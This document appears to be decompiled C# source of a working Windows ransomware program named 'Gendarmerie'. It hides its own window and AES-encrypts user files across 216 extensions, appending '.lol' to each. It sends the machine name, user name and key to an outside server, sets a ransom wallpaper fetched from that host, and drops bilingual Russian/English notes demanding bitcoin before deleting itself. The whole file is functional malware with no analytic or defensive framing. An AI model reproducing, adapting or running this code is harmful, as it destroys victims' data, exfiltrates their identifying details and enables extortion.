using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Gendarmerie_B.V._3;

public class GendarmerieForm : Form
{
	private string targetURL = "http://www.malware430.com/server/write.php";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\Users\\";

	private string backgroundImageUrl = "http://www.malware430.com/bkground.jpg";

	private string charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/@^";

	private IContainer components;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public GendarmerieForm()
	{
		InitializeComponent();
	}

	private void GendarmerieForm_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 1, 2, 2, 3, 3, 4, 4 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public string CreateRandomString(int length, string str)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append(str[random.Next(str.Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		try
		{
			string text = "?computer_name=" + computerName + "&userName=" + userName + "&password=" + password + "&allow=ransom";
			string address = targetURL + text;
			new WebClient().DownloadString(address);
		}
		catch (Exception)
		{
		}
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		try
		{
			File.WriteAllBytes(file, bytes2);
			string text = ".lol";
			File.Move(file, file + text);
		}
		catch (UnauthorizedAccessException)
		{
		}
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[216]
			{
				".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", "jpeg", ".png",
				".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
				".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp",
				".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass",
				".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb",
				".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map",
				".wmo", ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf",
				".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx",
				".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00",
				".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge",
				".kdb", ".db0", ".dba", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod",
				".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik",
				".epk", ".rgss3a", ".pak", ".big", "wallet", ".wotreplay", ".xxx", ".desc", ".py", ".m3u",
				".flv", ".js", ".css", ".rb", ".p7c", ".pk7", ".p7b", ".p12", ".pfx", ".pem",
				".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl",
				".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2",
				".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr",
				".indd", ".ai", ".eps", ".pdf", ".pdd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd",
				".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk",
				".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc",
				".odm", ".odp", ".ods", ".odt", ".cs", ".exe", ".lnk", ".mpeg", ".mp3", ".mkv",
				".divx", ".ogg", ".zip", ".wav", ".bat", ".index"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				if (!directories[j].Contains("Windows") && !directories[j].Contains("Program Files") && !directories[j].Contains("Program Files (x86)"))
				{
					encryptDirectory(directories[j], password);
					messageCreator();
				}
			}
		}
		catch (SystemException)
		{
		}
	}

	public static bool CheckForInternetConnection()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("https://www.google.com/"))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}

	public void startAction()
	{
		string password = "CreatePassword(15)";
		string text = "\\Desktop\\";
		string text2 = "\\Downloads\\";
		string text3 = "\\Documents\\";
		string text4 = "\\Pictures\\";
		string text5 = "\\Music\\";
		string text6 = "\\Videos\\";
		string location = userDir + userName + text;
		string location2 = userDir + userName + text2;
		string location3 = userDir + userName + text3;
		string location4 = userDir + userName + text4;
		string location5 = userDir + userName + text5;
		string location6 = userDir + userName + text6;
		SendPassword(password);
		string[] logicalDrives = Directory.GetLogicalDrives();
		foreach (string text7 in logicalDrives)
		{
			if (text7 == "C:\\")
			{
				encryptDirectory(location, password);
				encryptDirectory(location2, password);
				encryptDirectory(location3, password);
				encryptDirectory(location4, password);
				encryptDirectory(location5, password);
				encryptDirectory(location6, password);
				messageCreator();
			}
			else
			{
				encryptDirectory(text7, password);
			}
			messageCreator();
		}
		string path = userDir + userName + "\\ransom.jpg";
		bool flag;
		do
		{
			if (flag = CheckForInternetConnection())
			{
				SetWallpaperFromWeb(backgroundImageUrl, path);
				SendPassword(password);
			}
		}
		while (!flag);
		password = null;
		selfDestroy();
		Application.Exit();
	}

	public void selfDestroy()
	{
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C timeout 2 && Del /Q /F " + Application.get_ExecutablePath(),
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
	}

	public void SetWallpaper(string path)
	{
		SystemParametersInfo(20u, 0u, path, 3u);
	}

	private void SetWallpaperFromWeb(string url, string path)
	{
		try
		{
			new WebClient().DownloadFile(new Uri(url), path);
			SetWallpaper(path);
		}
		catch (Exception)
		{
		}
	}

	public void messageCreator()
	{
		string text = "\\Desktop\\Message.txt";
		string path = userDir + userName + text;
		string[] contents = new string[30]
		{
			"                        contact:  idostuff@protonmail.com ", "", "               I) Russian Version : ", " ", " Ваши важные файлы, видео, музыка, изображения, документы ... и т. Д. Зашифрованы с помощью шифрования.", "  RSA-2048 и AES-128. Расшифровать ваши файлы можно только с помощью закрытого ключа и файла.", "  программа дешифрования, которая находится на моем секретном сервере ", " Чтобы расшифровать файлы, следуйте приведенным ниже инструкциям. :  ", " ", " 1) Купить биткойны от 300 €, евро ( 0.05 btc ) ",
			" ", " 2) Отправьте биткойны на этот адрес :    ваш биткойн-адрес", "", " 3) когда я получаю биткойны, я расшифровываю ваши файлы", "", "", "                         contact:  idostuff@protonmail.com ", "", "                II) English Version : ", " ",
			" Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address", "", " 3) when I receive bitcoins, I decrypt your files"
		};
		File.WriteAllLines(path, contents);
		string text2 = "\\Downloads\\Message.txt";
		string path2 = userDir + userName + text2;
		string[] contents2 = new string[30]
		{
			"                        contact:  idostuff@protonmail.com ", "", "               I) Russian Version : ", " ", " Ваши важные файлы, видео, музыка, изображения, документы ... и т. Д. Зашифрованы с помощью шифрования.", "  RSA-2048 и AES-128. Расшифровать ваши файлы можно только с помощью закрытого ключа и файла.", "  программа дешифрования, которая находится на моем секретном сервере ", " Чтобы расшифровать файлы, следуйте приведенным ниже инструкциям. :  ", " ", " 1) Купить биткойны от 300 €, евро ( 0.05 btc ) ",
			" ", " 2) Отправьте биткойны на этот адрес :    ваш биткойн-адрес", "", " 3) когда я получаю биткойны, я расшифровываю ваши файлы", "", "", "                         contact:  idostuff@protonmail.com ", "", "                II) English Version : ", " ",
			" Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address", "", " 3) when I receive bitcoins, I decrypt your files"
		};
		File.WriteAllLines(path2, contents2);
		string text3 = "\\Documents\\Message.txt";
		string path3 = userDir + userName + text3;
		string[] contents3 = new string[30]
		{
			"                        contact:  idostuff@protonmail.com ", "", "               I) Russian Version : ", " ", " Ваши важные файлы, видео, музыка, изображения, документы ... и т. Д. Зашифрованы с помощью шифрования.", "  RSA-2048 и AES-128. Расшифровать ваши файлы можно только с помощью закрытого ключа и файла.", "  программа дешифрования, которая находится на моем секретном сервере ", " Чтобы расшифровать файлы, следуйте приведенным ниже инструкциям. :  ", " ", " 1) Купить биткойны от 300 €, евро ( 0.05 btc ) ",
			" ", " 2) Отправьте биткойны на этот адрес :    ваш биткойн-адрес", "", " 3) когда я получаю биткойны, я расшифровываю ваши файлы", "", "", "                         contact:  idostuff@protonmail.com ", "", "                II) English Version : ", " ",
			" Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address", "", " 3) when I receive bitcoins, I decrypt your files"
		};
		File.WriteAllLines(path3, contents3);
		string text4 = "\\Pictures\\Message.txt";
		string path4 = userDir + userName + text4;
		string[] contents4 = new string[30]
		{
			"                        contact:  idostuff@protonmail.com ", "", "               I) Russian Version : ", " ", " Ваши важные файлы, видео, музыка, изображения, документы ... и т. Д. Зашифрованы с помощью шифрования.", "  RSA-2048 и AES-128. Расшифровать ваши файлы можно только с помощью закрытого ключа и файла.", "  программа дешифрования, которая находится на моем секретном сервере ", " Чтобы расшифровать файлы, следуйте приведенным ниже инструкциям. :  ", " ", " 1) Купить биткойны от 300 €, евро ( 0.05 btc ) ",
			" ", " 2) Отправьте биткойны на этот адрес :    ваш биткойн-адрес", "", " 3) когда я получаю биткойны, я расшифровываю ваши файлы", "", "", "                         contact:  idostuff@protonmail.com ", "", "                II) English Version : ", " ",
			" Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address", "", " 3) when I receive bitcoins, I decrypt your files"
		};
		File.WriteAllLines(path4, contents4);
		string text5 = "\\Music\\Message.txt";
		string path5 = userDir + userName + text5;
		string[] contents5 = new string[30]
		{
			"                        contact:  idostuff@protonmail.com ", "", "               I) Russian Version : ", " ", " Ваши важные файлы, видео, музыка, изображения, документы ... и т. Д. Зашифрованы с помощью шифрования.", "  RSA-2048 и AES-128. Расшифровать ваши файлы можно только с помощью закрытого ключа и файла.", "  программа дешифрования, которая находится на моем секретном сервере ", " Чтобы расшифровать файлы, следуйте приведенным ниже инструкциям. :  ", " ", " 1) Купить биткойны от 300 €, евро ( 0.05 btc ) ",
			" ", " 2) Отправьте биткойны на этот адрес :    ваш биткойн-адрес", "", " 3) когда я получаю биткойны, я расшифровываю ваши файлы", "", "", "                         contact:  idostuff@protonmail.com ", "", "                II) English Version : ", " ",
			" Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address", "", " 3) when I receive bitcoins, I decrypt your files"
		};
		File.WriteAllLines(path5, contents5);
		string text6 = "\\Videos\\Message.txt";
		string path6 = userDir + userName + text6;
		string[] contents6 = new string[30]
		{
			"                        contact:  idostuff@protonmail.com ", "", "               I) Russian Version : ", " ", " Ваши важные файлы, видео, музыка, изображения, документы ... и т. Д. Зашифрованы с помощью шифрования.", "  RSA-2048 и AES-128. Расшифровать ваши файлы можно только с помощью закрытого ключа и файла.", "  программа дешифрования, которая находится на моем секретном сервере ", " Чтобы расшифровать файлы, следуйте приведенным ниже инструкциям. :  ", " ", " 1) Купить биткойны от 300 €, евро ( 0.05 btc ) ",
			" ", " 2) Отправьте биткойны на этот адрес :    ваш биткойн-адрес", "", " 3) когда я получаю биткойны, я расшифровываю ваши файлы", "", "", "                         contact:  idostuff@protonmail.com ", "", "                II) English Version : ", " ",
			" Your important files videos, music, images, documents ... etc are encrypted with encryption.", "  RSA-2048 and AES-128.Decrypting your files is only possible using a private key and a.", "  decryption program that are on my secret server ", " To decrypt your files, please follow the instructions below :  ", " ", " 1) Buy bitcoins from 300 €, euros (0.05 btc) ", " ", " 2) Send bitcoins to this address :    your bitcoin address", "", " 3) when I receive bitcoins, I decrypt your files"
		};
		File.WriteAllLines(path6, contents6);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GendarmerieForm));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(116, 52));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("GendarmerieForm");
		((Control)this).set_Text("Gendarmerie V.B.3");
		((Form)this).add_Load((EventHandler)GendarmerieForm_Load);
		((Control)this).ResumeLayout(false);
	}
}
